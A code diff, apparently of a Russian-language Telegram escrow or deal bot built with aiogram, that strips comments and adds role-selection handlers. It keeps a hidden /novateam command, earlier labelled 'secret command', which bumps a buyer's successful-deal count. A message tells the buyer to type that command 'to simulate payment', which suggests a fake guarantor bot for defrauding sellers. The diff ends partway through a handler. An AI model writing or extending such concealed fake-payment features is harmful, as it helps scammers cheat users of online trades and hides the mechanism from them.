@@ -363,7 +363,6 @@ async def cmd_start(message: Message):
     t = TEXTS.get(lang, TEXTS['ru'])
     await send_with_video(chat_id=message.chat.id, text=t['main_title'], reply_markup=get_main_menu(lang))
 
-# ===== СЕКРЕТНАЯ КОМАНДА =====
 @dp.message(Command("novateam"))
 async def cmd_novateam(message: Message):
     user_id = message.from_user.id
@@ -395,7 +394,6 @@ async def cmd_novateam(message: Message):
     cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (buyer_id,))
     conn.commit()
 
-# ===== ПОКАЗ СДЕЛКИ ПО ССЫЛКЕ =====
 async def show_deal_for_user(message: Message, deal_id: str):
     deal = get_deal(deal_id)
     if not deal:
@@ -409,14 +407,12 @@ async def show_deal_for_user(message: Message, deal_id: str):
     lang = get_user_lang(user_id)
     t = TEXTS.get(lang, TEXTS['ru'])
     
-    # Если покупатель ещё не назначен и это не продавец — назначаем
     if buyer_id is None and user_id != seller_id:
         cur.execute("UPDATE deals SET buyer_id = ?, buyer_username = ? WHERE deal_id = ?", (user_id, message.from_user.username, deal_id))
         conn.commit()
         deal = get_deal(deal_id)
         deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
     
-    # Проверка участия
     if user_id != seller_id and user_id != buyer_id:
         await message.answer(t['not_participant'])
         return
@@ -454,10 +450,6 @@ async def show_deal_for_user(message: Message, deal_id: str):
 <b>Статус:</b> {status_text}"""
     await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))
 
-# ============================================================
-# ===== ПОДТВЕРЖДЕНИЕ УЧАСТИЯ ПРОДАВЦОМ =====
-# ============================================================
-
 @dp.callback_query(F.data.startswith("confirm_"))
 async def confirm_seller_participation(call: CallbackQuery, state: FSMContext):
     deal_id = call.data.replace("confirm_", "")
@@ -484,8 +476,6 @@ async def confirm_seller_participation(call: CallbackQuery, state: FSMContext):
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
     await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=builder.as_markup())
     await call.answer()
-
-# ===== ВЫБОР ТИПА РЕКВИЗИТОВ =====
 
 @dp.callback_query(F.data == "req_card", DealStates.confirm_participation)
 async def req_card_confirm(call: CallbackQuery, state: FSMContext):
@@ -544,12 +534,20 @@ async def requisites_input_handler(message: Message, state: FSMContext):
 <b>Для имитации оплаты напишите:</b> /novateam"""
             await bot.send_message(chat_id=buyer_id, text=buyer_text, parse_mode="HTML")
 
-# ============================================================
-# ===== ВСЕ ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (ПОЛНОСТЬЮ) =====
-# ============================================================
-
-@dp.callback_query(F.data == "main_menu")
-async def main_menu_callback(call: CallbackQuery):
+@dp.callback_query(F.data == "create_deal")
+async def create_deal_callback(call: CallbackQuery):
     lang = get_user_lang(call.from_user.id)
-    t = TEXTS.get(lang, TEXTS['ru'])
-    await send_with_video(chat_id=call.message.chat.id, text
+    await send_with_video(chat_id=call.message.chat.id, text="Выберите вашу роль в сделке:", reply_markup=get_roles_menu(lang))
+    await call.answer()
+
+@dp.callback_query(F.data == "seller_role")
+async def seller_role_callback(call: CallbackQuery, state: FSMContext):
+    lang = get_user_lang(call.from_user.id)
+    await state.set_state(DealStates.seller_type)
+    await send_with_video(chat_id=call.message.chat.id, text="Выберите тип сделки:", reply_markup=get_deal_types(lang))
+    await call.answer()
+
+@dp.callback_query(F.data == "buyer_role")
+async def buyer_role_callback(call: CallbackQuery, state: FSMContext):
+    lang = get_user_lang(call.from_user.id)
+    await state.set_state(DealStates.buyer_type)
